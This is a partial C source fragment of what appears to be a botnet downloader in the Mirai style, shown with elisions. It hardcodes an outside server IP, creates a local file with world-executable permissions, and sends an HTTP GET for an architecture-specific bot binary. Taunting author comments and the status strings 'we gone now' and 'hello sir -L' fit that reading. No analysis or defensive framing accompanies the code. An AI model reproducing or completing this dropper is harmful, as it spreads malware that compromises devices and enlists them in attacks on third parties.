...
// -L haha you already got an idea of who this is? ^.^
#define HTTP_SERVER utils_inet_addr(192,3,104,62)

#define EXEC_MSG            "we gone now\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "hello sir -L\n"
...
inline void run(void)
{
    ...
    ffd = open("wrgnuwrijo", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /wrgjwrgjwrg246356356356/h" BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
...
{                      //  this 
    return syscall(SCN(SYS_openat), path, flags, other); // openat, if gives error use open
}
